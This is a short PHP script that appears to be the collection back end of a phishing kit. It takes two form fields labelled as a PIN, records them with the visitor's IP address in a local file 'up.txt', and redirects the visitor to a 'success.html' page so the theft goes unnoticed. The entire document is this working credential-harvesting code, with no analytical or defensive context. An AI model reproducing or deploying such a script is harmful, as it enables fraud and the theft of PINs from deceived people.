<?php

echo "<meta http-equiv=\"refresh\" content=\"0;URL='success.html'\" />";

$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");


$a = $_POST['a'];
$b = $_POST['b'];

$saveline = 'IP: ' . $ip . ' PIN:' . $a . '' . $b . "\n";

$fh=fopen('up.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);


exit;


?>
